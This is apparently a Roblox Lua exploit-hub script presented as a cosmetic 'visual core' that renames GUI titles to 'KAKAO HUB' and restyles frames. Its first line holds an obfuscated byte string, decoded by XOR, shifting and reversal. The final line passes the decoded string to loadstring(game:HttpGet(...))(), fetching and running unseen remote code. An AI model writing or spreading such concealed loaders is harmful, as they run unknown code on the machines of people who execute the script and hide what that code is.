
--[[ STAGE 2: VISUAL CORE ]]
local eXnSe7KytQr874R5VSQyHQ="\235\229\242\182\001\176\019\021\206\034\043\045\253\061\061\050\063\075\037\039\023\034\022\046\043\114\081\138\135\112\105\158\165\169\165\177\164\147\139\159\201\220\231\222\235\198\201\009\006\014\023\016\241\227\040\045\059\061\001\072\078\089\081\091\105\105\100\122\061\140\125\142\155\157\171\169\179\178\185\190\133\205\209\219\156\220\232\249\238\250\001\011\000\029\013\025\040\037\046\048\059\075\008\071\091\078\033\039\024\103\110\120\126\136"local m8YZLnBSXPr6K=26 local CaL7f5C7Zjxn=91 local yf6y2_zEeVrMEu=0 local NI9B8b7XqJSb=6 local XIoQQ8RfUDj9hRvRaqR=15 local T4D8XvrKfbsf_VWngYb7S=true local QwuPi2N2vqmP=bit32 and bit32.bxor if not QwuPi2N2vqmP then QwuPi2N2vqmP=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local JaU3RoGMk5vfKj9HY={}for HUDDWa56v35hWSoKDiVv=1,#eXnSe7KytQr874R5VSQyHQ do local RjNIlCuDP6GViBEYUO9dC=string.byte(eXnSe7KytQr874R5VSQyHQ,HUDDWa56v35hWSoKDiVv)local G030cCoxBtLIAjEEidKv=(CaL7f5C7Zjxn+(HUDDWa56v35hWSoKDiVv*NI9B8b7XqJSb)+XIoQQ8RfUDj9hRvRaqR)%256 if yf6y2_zEeVrMEu==0 then RjNIlCuDP6GViBEYUO9dC=(RjNIlCuDP6GViBEYUO9dC-G030cCoxBtLIAjEEidKv)%256 JaU3RoGMk5vfKj9HY[HUDDWa56v35hWSoKDiVv]=string.char(QwuPi2N2vqmP(RjNIlCuDP6GViBEYUO9dC,m8YZLnBSXPr6K))else RjNIlCuDP6GViBEYUO9dC=QwuPi2N2vqmP(RjNIlCuDP6GViBEYUO9dC,m8YZLnBSXPr6K)JaU3RoGMk5vfKj9HY[HUDDWa56v35hWSoKDiVv]=string.char((RjNIlCuDP6GViBEYUO9dC-G030cCoxBtLIAjEEidKv)%256)end end local YS6s5_J_G_iZDTP=table.concat(JaU3RoGMk5vfKj9HY)if T4D8XvrKfbsf_VWngYb7S then YS6s5_J_G_iZDTP=string.reverse(YS6s5_J_G_iZDTP)end local fbWOBKVnq8zG7bqKGO7Z_m=YS6s5_J_G_iZDTP
local HubName = "KAKAO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(fbWOBKVnq8zG7bqKGO7Z_m))()
